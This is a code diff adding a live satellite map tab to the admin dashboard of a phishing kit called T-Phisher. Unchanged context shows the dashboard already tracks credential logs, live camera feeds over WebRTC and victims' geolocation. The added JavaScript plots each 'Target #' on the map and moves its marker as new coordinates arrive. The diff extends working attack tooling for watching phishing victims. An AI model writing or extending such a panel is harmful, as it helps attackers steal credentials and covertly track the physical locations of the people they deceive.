@@ -6,6 +6,8 @@
   <title>T-Phisher — Admin Panel</title>
   <meta name="description" content="T-Phisher Admin Dashboard">
   <link rel="stylesheet" href="/admin.css">
+  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
   <script src="/socket.io/socket.io.js"></script>
 </head>
 <body>
@@ -133,6 +135,10 @@
       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 7 16 12l7 5V7z"/><rect x="1" y="5" width="15" height="14" rx="2"/></svg>
       Live Camera
       <span class="tab-badge red" id="badge-camera" style="display:none">LIVE</span>
+    </button>
+    <button class="tab-btn" id="tab-map" onclick="switchTab('map')">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="3 6 9 3 15 6 21 3 21 18 15 21 9 18 3 21"></polygon><line x1="9" y1="3" x2="9" y2="18"></line><line x1="15" y1="6" x2="15" y2="21"></line></svg>
+      Live Map
     </button>
   </nav>
 
@@ -385,6 +391,22 @@
       </div>
     </div>
 
+    <!-- ─── TAB: LIVE MAP ─────────────────────────────────────────── -->
+    <div class="tab-panel" id="panel-map">
+      <div class="panel" style="height: calc(100vh - 120px); display: flex; flex-direction: column;">
+        <div class="panel-header">
+          <div class="panel-title">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="3 6 9 3 15 6 21 3 21 18 15 21 9 18 3 21"></polygon><line x1="9" y1="3" x2="9" y2="18"></line><line x1="15" y1="6" x2="15" y2="21"></line></svg>
+            Live Target Map
+          </div>
+          <div class="panel-actions">
+            <button class="btn-action" onclick="refreshLocation()">📍 Refresh Locations</button>
+          </div>
+        </div>
+        <div id="location-map" style="flex: 1; border-radius: 6px; z-index: 1;"></div>
+      </div>
+    </div>
+
   </div>
 </div>
 
@@ -428,6 +450,9 @@ let credLogs    = [];
 let alertCount  = 0;
 let activeTab   = 'overview';
 const peerConnections = {}; // targetId -> RTCPeerConnection
+
+let liveMap = null;
+let mapMarkers = {};
 
 // ─── Login ────────────────────────────────────────────────────────
 document.getElementById('admin-password').addEventListener('keydown', e => {
@@ -725,6 +750,7 @@ function handleMessage(msg) {
       if (targets[msg.clientId]) {
         targets[msg.clientId].location = { lat: msg.lat, lng: msg.lng, accuracy: msg.accuracy };
         refreshUsersPanel();
+        updateMapMarker(msg.clientId, msg.lat, msg.lng);
       }
       break;
     }
@@ -1049,6 +1075,33 @@ function switchTab(name) {
   document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
   document.getElementById('tab-'    + name)?.classList.add('active');
   document.getElementById('panel-'  + name)?.classList.add('active');
+
+  if (name === 'map') {
+    if (!liveMap) initLiveMap();
+    setTimeout(() => liveMap.invalidateSize(), 10);
+  }
+}
+
+function initLiveMap() {
+  // Initialize with a default view (world map)
+  liveMap = L.map('location-map').setView([20, 0], 2);
+  
+  // Esri World Imagery (Satellite View)
+  L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', {
+    attribution: 'Tiles &copy; Esri &mdash; Source: Esri, i-cubed, USDA, USGS, AEX, GeoEye, Getmapping, Aerogrid, IGN, IGP, UPR-EGP, and the GIS User Community'
+  }).addTo(liveMap);
+}
+
+function updateMapMarker(clientId, lat, lng) {
+  if (!liveMap) return;
+  
+  if (mapMarkers[clientId]) {
+    mapMarkers[clientId].setLatLng([lat, lng]);
+  } else {
+    // Create new marker
+    mapMarkers[clientId] = L.marker([lat, lng]).addTo(liveMap)
+      .bindPopup(`Target #${clientId}<br>Lat: ${lat.toFixed(4)}, Lng: ${lng.toFixed(4)}`);
+  }
 }
 
 // ─── Commands ─────────────────────────────────────────────────────
